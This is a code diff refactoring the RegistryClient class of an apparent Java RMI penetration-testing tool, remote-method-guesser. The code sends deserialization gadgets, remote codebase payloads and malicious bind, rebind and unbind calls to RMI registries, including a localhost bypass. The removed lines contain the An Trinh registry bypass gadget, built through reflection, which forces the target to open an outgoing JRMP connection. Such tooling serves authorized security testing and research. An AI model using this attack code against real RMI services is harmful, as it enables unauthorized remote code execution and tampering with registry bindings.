@@ -1,28 +1,16 @@
 package de.qtc.rmg.operations;
 
-import java.io.ObjectOutputStream;
-import java.lang.reflect.Constructor;
-import java.lang.reflect.Field;
-import java.lang.reflect.Proxy;
 import java.rmi.server.ObjID;
-import java.rmi.server.RMIClientSocketFactory;
-import java.rmi.server.RMIServerSocketFactory;
-import java.rmi.server.RemoteObjectInvocationHandler;
-import java.rmi.server.RemoteRef;
-import java.rmi.server.UnicastRemoteObject;
 
 import javax.management.remote.rmi.RMIServerImpl_Stub;
 
 import de.qtc.rmg.internal.ExceptionHandler;
 import de.qtc.rmg.io.Logger;
 import de.qtc.rmg.io.MaliciousOutputStream;
-import de.qtc.rmg.networking.DummySocketFactory;
 import de.qtc.rmg.networking.RMIWhisperer;
-import de.qtc.rmg.utils.RMGUtils;
+import de.qtc.rmg.utils.YsoIntegration;
 import sun.rmi.server.UnicastRef;
-import sun.rmi.transport.Endpoint;
 import sun.rmi.transport.LiveRef;
-import sun.rmi.transport.StreamRemoteCall;
 import sun.rmi.transport.tcp.TCPEndpoint;
 
 
@@ -33,15 +21,14 @@ import sun.rmi.transport.tcp.TCPEndpoint;
  *
  * @author Tobias Neitzel (@qtc_de)
  */
+
 @SuppressWarnings("restriction")
 public class RegistryClient {
 
     private RMIWhisperer rmi;
-    private Field enableReplaceField;
 
     private static final long interfaceHash = 4905912898345647071L;
-    private static final String[] callNames = new String[] {"bind", "list", "lookup", "rebind", "unbind"};
-    private static final long[] hashCodes = new long[] {7583982177005850366L, 2571371476350237748L, -7538657168040752697L, -8381844669958460146L, 7305022919901907578L };
+    private static final ObjID objID = new ObjID(ObjID.REGISTRY_ID);
 
     /**
      * Initializes the class and makes some required fields accessible by using reflection. These fields are
@@ -53,16 +40,6 @@ public class RegistryClient {
     public RegistryClient(RMIWhisperer rmiRegistry)
     {
         this.rmi = rmiRegistry;
-
-        try {
-            enableReplaceField = ObjectOutputStream.class.getDeclaredField("enableReplace");
-            enableReplaceField.setAccessible(true);
-
-        } catch(SecurityException | NoSuchFieldException e) {
-            Logger.eprintlnMixedYellow("Unexpected Exception caught during", "RegistryClient", "instantiation.");
-            ExceptionHandler.stackTrace(e);
-            RMGUtils.exit();
-        }
     }
 
     public void bindObject(String boundName, String host, int port, boolean localhostBypass)
@@ -75,13 +52,14 @@ public class RegistryClient {
         Object payloadObject = null;
 
         try {
-            payloadObject = generateRMIServerImpl(host, port);
+            payloadObject = prepareRMIServerImpl(host, port);
+
         } catch(Exception e) {
             ExceptionHandler.internalException(e, "RegistryClient.bindObject", true);
         }
 
         try {
-            bindCall(boundName, payloadObject, false, localhostBypass);
+            registryCall("bind", new Object[] {boundName, payloadObject}, false, localhostBypass);
             Logger.printlnMixedBlue("Encountered", "no Exception", "during bind call.");
             Logger.printlnMixedYellow("Bind operation", "was probably successful.");
 
@@ -125,14 +103,14 @@ public class RegistryClient {
         Object payloadObject = null;
 
         try {
-            payloadObject = generateRMIServerImpl(host, port);
+            payloadObject = prepareRMIServerImpl(host, port);
 
         } catch(Exception e) {
             ExceptionHandler.internalException(e, "RegistryClient.rebindObject", true);
         }
 
         try {
-            rebindCall(boundName, payloadObject, false, localhostBypass);
+            registryCall("rebind", new Object[] {boundName, payloadObject}, false, localhostBypass);
             Logger.printlnMixedBlue("Encountered", "no Exception", "during rebind call.");
             Logger.printlnMixedYellow("Rebind operation", "was probably successful.");
 
@@ -167,7 +145,7 @@ public class RegistryClient {
         Logger.increaseIndent();
 
         try {
-            unbindCall(boundName, false, localhostBypass);
+            registryCall("unbind", new Object[] {boundName}, false, localhostBypass);
             Logger.printlnMixedBlue("Encountered", "no Exception", "during unbind call.");
             Logger.printlnMixedYellow("Unbind operation", "was probably successful.");
 
@@ -204,7 +182,7 @@ public class RegistryClient {
      * @param marshal  indicates whether the registry server uses readObject() to unmarshall Strings (true)
      * @param regMethod  the registry method to use for the operation (lookup|bind|rebind|unbind)
      */
-    public void enumCodebase(boolean marshal, String regMethod, boolean localHostBypass)
+    public void enumCodebase(boolean marshal, String regMethod, boolean localhostBypass)
     {
         Logger.printlnBlue("RMI server useCodebaseOnly enumeration:");
         Logger.println("");
@@ -221,7 +199,7 @@ public class RegistryClient {
 
         try {
 
-            callByName(regMethod, 0, true, localHostBypass, "");
+            registryCall(regMethod, packArgsByName(regMethod, 0), true, localhostBypass);
 
         } catch( java.rmi.ServerException e ) {
 
@@ -243,7 +221,7 @@ public class RegistryClient {
 
             } else if( t instanceof java.rmi.AccessException && t.getMessage().contains("non-local host") ) {
                 Logger.eprintlnMixedYellow("Unable to enumerate useCodebaseOnly by using", regMethod, "call.");
-                ExceptionHandler.nonLocalhost(e, regMethod, localHostBypass);
+                ExceptionHandler.nonLocalhost(e, regMethod, localhostBypass);
 
             } else {
                 ExceptionHandler.unexpectedException(e, regMethod, "call", false);
@@ -281,7 +259,7 @@ public class RegistryClient {
         Logger.increaseIndent();
 
         try {
-            lookupCall(0, true);
+            registryCall("lookup", new Object[] {0}, true, false);
 
         } catch( java.rmi.ServerException e ) {
 
@@ -328,8 +306,10 @@ public class RegistryClient {
         Logger.println("");
         Logger.increaseIndent();
 
+        Object[] payload = new Object[] {"If this name exists on the registry, it is definitely the maintainers fault..."};
+
         try {
-            unbindCall("If this name exists on the registry, it is definitely the maintainers fault...", false, true);
+            registryCall("unbind", payload, false, true);
 
         } catch( java.rmi.ServerException e ) {
 
@@ -377,13 +357,13 @@ public class RegistryClient {
         }
 
         try {
-            payloadObject = generateBypassObject("127.0.0.1", 1234567);
+            payloadObject = YsoIntegration.prepareAnTrinhGadget("127.0.0.1", 1234567);
         } catch(Exception e) {
             ExceptionHandler.unexpectedException(e, "pyload", "creation", true);
         }
 
         try {
-            callByName(regMethod, payloadObject, false, localhostBypass, "");
+            registryCall(regMethod, packArgsByName(regMethod, payloadObject), false, localhostBypass);
 
         } catch( java.rmi.ServerException e ) {
 
@@ -418,7 +398,7 @@ public class RegistryClient {
         }
     }
 
-    public void gadgetCall(Object payloadObject, String regMethod, boolean localHostBypass)
+    public void gadgetCall(Object payloadObject, String regMethod, boolean localhostBypass)
     {
         Logger.println("");
         Logger.printlnBlue("Attempting deserialization attack on RMI registry endpoint...");
@@ -427,7 +407,7 @@ public class RegistryClient {
 
         try {
 
-            callByName(regMethod, payloadObject, false, localHostBypass, "");
+            registryCall(regMethod, packArgsByName(regMethod, payloadObject), false, localhostBypass);
 
         } catch( java.rmi.ServerException e ) {
 
@@ -459,7 +439,7 @@ public class RegistryClient {
         }
     }
 
-    public void codebaseCall(Object payloadObject, String regMethod, boolean localHostBypass)
+    public void codebaseCall(Object payloadObject, String regMethod, boolean localhostBypass)
     {
         String className = payloadObject.getClass().getName();
 
@@ -472,7 +452,7 @@ public class RegistryClient {
 
         try {
 
-            callByName(regMethod, payloadObject, false, localHostBypass, "");
+            registryCall(regMethod, packArgsByName(regMethod, payloadObject), false, localhostBypass);
 
         } catch( java.rmi.ServerException e ) {
 
@@ -510,38 +490,72 @@ public class RegistryClient {
         }
     }
 
-    /*
-    * The bypass technique implemented by this code was discovered by An Trinh (@_tint0) and a detailed analysis was
-    * provided by Hans-Martin Münch (@h0ng10). Certain portions of the code were copied from the corresponding blog post:
-    * https://mogwailabs.de/de/blog/2020/02/an-trinhs-rmi-registry-bypass/
-    *
-    * @param host  listener address for the outgoing JRMP connection
-    * @param port  listener port for the outgoing JRMP connection
-    * @param regMethod  registry Method to use for the call
-    */
-    public static Object generateBypassObject(String host, int port) throws Exception
+    private void registryCall(String callName, Object[] callArguments, boolean maliciousStream, boolean bypass) throws Exception
     {
-        Constructor<UnicastRemoteObject> constructor = UnicastRemoteObject.class.getDeclaredConstructor(int.class, RMIClientSocketFactory.class, RMIServerSocketFactory.class);
-        constructor.setAccessible(true);
+        if(bypass)
+            rmi.genericCall(objID, -1, getHashByName(callName), callArguments, maliciousStream, callName);
+        else
+            rmi.genericCall(objID, getCallByName(callName), interfaceHash, callArguments, maliciousStream, callName);
+    }
 
-        Field ssfField = UnicastRemoteObject.class.getDeclaredField("ssf");
-        ssfField.setAccessible(true);
+    private int getCallByName(String callName)
+    {
+        switch(callName) {
+            case "bind":
+                return 0;
+            case "list":
+                return 1;
+            case "lookup":
+                return 2;
+            case "rebind":
+                return 3;
+            case "unbind":
+                return 4;
+            default:
+                ExceptionHandler.internalError("RegistryClient.getCallIDByName", "Unable to find callID for method '" + callName + "'.");
+        }
 
-        TCPEndpoint endpoint = new TCPEndpoint(host, port);
-        UnicastRef refObject = new UnicastRef(new LiveRef(new ObjID(123), endpoint, false));
+        return 0;
+    }
 
-        RemoteObjectInvocationHandler payloadInvocationHandler = new RemoteObjectInvocationHandler(refObject);
-        RMIServerSocketFactory proxySSF = (RMIServerSocketFactory) Proxy.newProxyInstance(
-            RMIServerSocketFactory.class.getClassLoader(),
-            new Class[] { RMIServerSocketFactory.class, java.rmi.Remote.class },
-            payloadInvocationHandler);
+    private long getHashByName(String callName)
+    {
+        switch(callName) {
+            case "bind":
+                return 7583982177005850366L;
+            case "list":
+                return 2571371476350237748L;
+            case "lookup":
+                return -7538657168040752697L;
+            case "rebind":
+                return -8381844669958460146L;
+            case "unbind":
+                return 7305022919901907578L;
+            default:
+                ExceptionHandler.internalError("RegistryClient.getMethodHashByName", "Unable to find method hash for method '" + callName + "'.");
+        }
 
-        UnicastRemoteObject payloadObject = null;
-        payloadObject = (UnicastRemoteObject)constructor.newInstance(new Object[]{0, null, new DummySocketFactory()});
-        UnicastRemoteObject.unexportObject(payloadObject, true);
+        return 0L;
+    }
 
-        ssfField.set(payloadObject, proxySSF);
-        return payloadObject;
+    private Object[] packArgsByName(String callName, Object payloadObject)
+    {
+        switch(callName) {
+            case "bind":
+                return new Object[] {"rmg", payloadObject};
+            case "list":
+                return new Object[] {};
+            case "lookup":
+                return new Object[] {payloadObject};
+            case "rebind":
+                return new Object[] {"rmg", payloadObject};
+            case "unbind":
+                return new Object[] {payloadObject};
+            default:
+                ExceptionHandler.internalError("RegistryClient.packArgsByName", "Unable to find pack strategie for method '" + callName + "'.");
+        }
+
+        return null;
     }
 
     /**
@@ -554,150 +568,10 @@ public class RegistryClient {
      * @return   RMIServerImpl_Stub as used by JMX
      * @throws Exception
      */
-    public Object generateRMIServerImpl(String host, int port) throws Exception
+    private Object prepareRMIServerImpl(String host, int port) throws Exception
     {
         TCPEndpoint endpoint = new TCPEndpoint(host, port);
         UnicastRef refObject = new UnicastRef(new LiveRef(new ObjID(123), endpoint, false));
         return new RMIServerImpl_Stub(refObject);
-    }
-
-    public void callByName(String callName, Object payloadObject, boolean maliciousStream, boolean bypass, String boundName) throws Exception
-    {
-        switch(callName) {
-
-            case "lookup":
-                lookupCall(payloadObject, maliciousStream);
-                break;
-
-            case "bind":
-                bindCall(boundName, payloadObject, maliciousStream, bypass);
-                break;
-
-            case "rebind":
-                rebindCall(boundName, payloadObject, maliciousStream, bypass);
-                break;
-
-            case "unbind":
-                unbindCall(payloadObject, maliciousStream, bypass);
-                break;
-
-            default:
-                ExceptionHandler.internalError("RegistryClient.callByName", "The function was called with an unknown callname");
-        }
-    }
-
-    private void bindCall(String boundName, Object payloadObject, boolean maliciousStream, boolean bypass) throws Exception
-    {
-        Object[] callArguments = new Object[] {boundName, payloadObject};
-        if(bypass)
-            genericCall(-1, callArguments, maliciousStream, "bind");
-        else
-            genericCall(0, callArguments, maliciousStream);
-    }
-
-    private void lookupCall(Object payloadObject, boolean maliciousStream) throws Exception
-    {
-        Object[] callArguments = new Object[] {payloadObject};
-        genericCall(2, callArguments, maliciousStream);
-    }
-
-    private void rebindCall(String boundName, Object payloadObject, boolean maliciousStream, boolean bypass) throws Exception
-    {
-        Object[] callArguments = new Object[] {boundName, payloadObject};
-        if(bypass)
-            genericCall(-1, callArguments, maliciousStream, "rebind");
-        else
-            genericCall(3, callArguments, maliciousStream);
-    }
-
-    private void unbindCall(Object payloadObject, boolean maliciousStream, boolean bypass) throws Exception
-    {
-        Object[] callArguments = new Object[] {payloadObject};
-        if(bypass)
-            genericCall(-1, callArguments, maliciousStream, "unbind");
-        else
-            genericCall(4, callArguments, maliciousStream);
-    }
-
-    private void genericCall(int callID, Object[] callArguments, boolean maliciousStream) throws Exception
-    {
-        genericCall(callID, callArguments, maliciousStream, null);
-    }
-
-    @SuppressWarnings("deprecation")
-    private void genericCall(int callID, Object[] callArguments, boolean maliciousStream, String callName) throws Exception
-    {
-        long hash = interfaceHash;
-
-        if(callID >= 0) {
-            callName = callNames[callID];
-
-        } else if(callName != null){
-
-            for(int ctr = 0; ctr < callNames.length; ctr++) {
-                if( callName.equals(callNames[ctr]) ) {
-                    hash = hashCodes[ctr];
-                    break;
-                }
-            }
-
-            if( hash == interfaceHash ) {
-                ExceptionHandler.internalError("RegistryClient.genericCall", "Unable to find method hash for method '" + callName + "'.");
-            }
-
-        } else {
-            ExceptionHandler.internalError("RegistryClient.genericCall", "Violation in the calling convention of the function.");
-        }
-
-        try {
-            Endpoint endpoint = rmi.getEndpoint();
-            RemoteRef remoteRef = new UnicastRef(new LiveRef(new ObjID(ObjID.REGISTRY_ID), endpoint, false));
-
-            StreamRemoteCall call = (StreamRemoteCall)remoteRef.newCall(null, null, callID, hash);
-            try {
-                ObjectOutputStream out = (ObjectOutputStream)call.getOutputStream();
-                enableReplaceField.set(out, false);
-
-                if(maliciousStream)
-                    out = new MaliciousOutputStream(out);
-
-                for(Object o : callArguments)
-                    out.writeObject(o);
-
-            } catch(java.io.IOException e) {
-                throw new java.rmi.MarshalException("error marshalling arguments", e);
-            }
-
-            remoteRef.invoke(call);
-            remoteRef.done(call);
-
-        } catch(java.rmi.ConnectException e) {
-
-            Throwable t = ExceptionHandler.getCause(e);
-
-            if( t instanceof java.net.ConnectException && t.getMessage().contains("Connection refused")) {
-                ExceptionHandler.connectionRefused(e, callName, "call");
-
-            } else {
-                ExceptionHandler.unexpectedException(e, callName, "call", true);
-            }
-
-        } catch(java.rmi.ConnectIOException e) {
-
-            Throwable t = ExceptionHandler.getCause(e);
-
-            if( t instanceof java.net.NoRouteToHostException) {
-                ExceptionHandler.noRouteToHost(e, callName, "call");
-
-            } else if( t instanceof java.rmi.ConnectIOException && t.getMessage().contains("non-JRMP server")) {
-                ExceptionHandler.noJRMPServer(e, callName, "call");
-
-            } else if( t instanceof javax.net.ssl.SSLException && t.getMessage().contains("Unsupported or unrecognized SSL message")) {
-                ExceptionHandler.sslError(e, callName, "call");
-
-            } else {
-                ExceptionHandler.unexpectedException(e, callName, "call", true);
-            }
-        }
     }
 }
